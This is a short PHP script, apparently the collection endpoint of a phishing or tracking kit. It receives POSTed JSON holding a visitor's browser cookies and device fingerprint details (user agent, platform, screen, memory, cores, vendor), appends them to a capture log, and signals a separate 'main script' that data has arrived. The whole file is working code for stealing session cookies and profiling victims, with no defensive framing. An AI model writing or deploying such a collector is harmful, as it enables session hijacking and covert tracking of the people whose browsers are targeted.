<?php
// device.php - Handles detailed device info and cookies
$date = date('dMYHis');
$file = 'device_info.txt';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $json = json_decode($data, true);
    
    if ($json) {
        $logEntry = "[$date] Device Info Captured:\n";
        $logEntry .= "Cookies: " . ($json['cookies'] ?? 'None') . "\n";
        $logEntry .= "User Agent: " . ($json['userAgent'] ?? 'Unknown') . "\n";
        $logEntry .= "Platform: " . ($json['platform'] ?? 'Unknown') . "\n";
        $logEntry .= "Screen: " . ($json['screen'] ?? 'Unknown') . "\n";
        $logEntry .= "Language: " . ($json['language'] ?? 'Unknown') . "\n";
        $logEntry .= "Memory: " . ($json['memory'] ?? 'Unknown') . " GB\n";
        $logEntry .= "Cores: " . ($json['cores'] ?? 'Unknown') . "\n";
        $logEntry .= "Browser Vendor: " . ($json['vendor'] ?? 'Unknown') . "\n";
        $logEntry .= "--------------------------------------------------\n\n";
        
        file_put_contents($file, $logEntry, FILE_APPEND);
        file_put_contents("Log.log", "Device info received!\n", FILE_APPEND); // Trigger notification in main script
    }
}
?>
